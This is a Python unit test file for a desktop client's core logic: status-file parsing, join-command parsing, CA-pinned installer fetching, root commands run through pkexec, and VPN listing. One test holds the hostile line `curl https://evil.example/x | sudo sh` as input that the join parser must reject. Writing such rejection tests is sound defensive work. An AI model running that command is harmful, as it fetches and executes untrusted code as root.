"""kiwi-desktop's parts without GTK (gui/kiwi_desktop_core.py): the agent's status file, the join
command the control page shows, the agent's commands as root."""
import base64
import os
import subprocess
import sys
import tempfile
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path[:0] = [os.path.join(HERE, "..", "gui"), os.path.join(HERE, "..", "lib")]

import kiwi_desktop_core as core  # noqa: E402
from kiwiserver import clientagent  # noqa: E402

CA = "-----BEGIN CERTIFICATE-----\nTEST\n-----END CERTIFICATE-----\n"


class TestDesktopCore(unittest.TestCase):
    def status(self, text):
        fd, path = tempfile.mkstemp()
        with os.fdopen(fd, "w") as f:
            f.write(text)
        self.addCleanup(os.remove, path)
        return core.read_status(path)

    def test_the_agents_status_is_read(self):
        now = int(time.time())
        st = self.status("name desk\ncontrol https://control.papaya.home\nasked %d\nanswer 200\nok %d\nos Bluefin (43)\n"
                         "vpn kiwi-home 10.9.0.40/32\ncrypt 1\nclevis 0\nunlock waits\nupdates staged\nagent 4\n" % (now, now))
        self.assertEqual((st["name"], st["crypt"], st["vpn"]), ("desk", 1, [{"link": "kiwi-home", "address": "10.9.0.40/32"}]))
        self.assertEqual(core.reported(st, now), ("ok", "the network has it, just now"))
        self.assertEqual(core.disk(st), ("warn", "encrypted; the network's rings are not bound to it yet"))
        self.assertEqual(core.updates(st), "one waits for a restart")
        self.assertEqual(core.read_status("/nonexistent/status"), {})          # no agent: not joined

    def test_a_report_that_was_refused_or_is_old_says_so(self):
        now = int(time.time())
        st = {"asked": now, "answer": "403 {\"error\":\"its clock and this one's are more than 5 minutes apart\"}", "ok": now - 7200}
        level, words = core.reported(st, now)
        self.assertEqual(level, "warn")
        self.assertIn("2 hours ago", words)
        self.assertIn("more than 5 minutes apart", words)
        self.assertEqual(core.reported({"asked": now, "answer": "000 curl: (6) Could not resolve host"}, now)[0], "bad")
        self.assertEqual(core.reported({}, now), ("bad", "no agent on this computer"))

    def test_the_join_command_of_the_control_page_is_understood(self):
        command = clientagent.join_command("https://control.papaya.home", "abcdefghijklmnop_QRST-123",
                                           base64.b64encode(CA.encode()).decode())
        ca_b64, url = core.parse_join("  " + command + "\n")
        self.assertEqual(base64.b64decode(ca_b64).decode(), CA)
        self.assertEqual(url, "https://control.papaya.home/api/client/join/abcdefghijklmnop_QRST-123")
        self.assertIsNone(core.parse_join("curl https://evil.example/x | sudo sh"))

    def test_the_agent_is_fetched_against_the_commands_ca_only(self):
        seen = {}

        class Answer:
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

            def read(self):
                return b"#!/bin/sh\necho the installer\n"

        def opener(url, timeout, context):
            seen["url"], seen["ca"] = url, context.get_ca_certs()
            return Answer()
        d = tempfile.mkdtemp()
        subprocess.run(["openssl", "req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:P-256", "-nodes",
                        "-keyout", os.path.join(d, "k"), "-out", os.path.join(d, "c"), "-subj", "/CN=Kiwi test CA", "-days", "1"],
                       check=True, capture_output=True)
        with open(os.path.join(d, "c")) as f:
            real = f.read()
        got = core.fetch_join(base64.b64encode(real.encode()).decode(), "https://control.test/api/client/join/x", opener)
        self.assertEqual(got, b"#!/bin/sh\necho the installer\n")
        self.assertEqual([c["subject"] for c in seen["ca"]], [((("commonName", "Kiwi test CA"),),)])   # that CA alone
        leftover = [f for f in os.listdir(os.environ.get("XDG_RUNTIME_DIR") or tempfile.gettempdir()) if f.startswith("kiwi-ca-")]
        self.assertEqual(leftover, [])              # its copy of the CA is gone either way
        with self.assertRaisesRegex(ValueError, "no certificate"):
            core.fetch_join(base64.b64encode(b"nothing").decode(), "https://control.test/x", opener)

    def test_root_commands_go_through_pkexec_with_their_input(self):
        ran = []

        def runner(argv, input=None, capture_output=True):
            ran.append((argv, input))
            return subprocess.CompletedProcess(argv, 1, b"", b"clevis: wrong passphrase\n")
        self.assertEqual(core.as_root([core.AGENT, "bind", "--stdin"], b"secret", runner), (1, "clevis: wrong passphrase"))
        self.assertEqual(ran, [(["pkexec", "/usr/local/sbin/kiwi-client-agent", "bind", "--stdin"], b"secret")])

    def test_the_kiwi_connections_and_whether_they_are_up(self):
        def runner(argv, capture_output=True, text=True):
            return subprocess.CompletedProcess(argv, 0, "kiwi-home:kiwi-home\nWired:enp1s0\nkiwi-other:\n", "")
        self.assertEqual(core.vpn_connections(runner), {"kiwi-home": True, "kiwi-other": False})


if __name__ == "__main__":
    unittest.main()
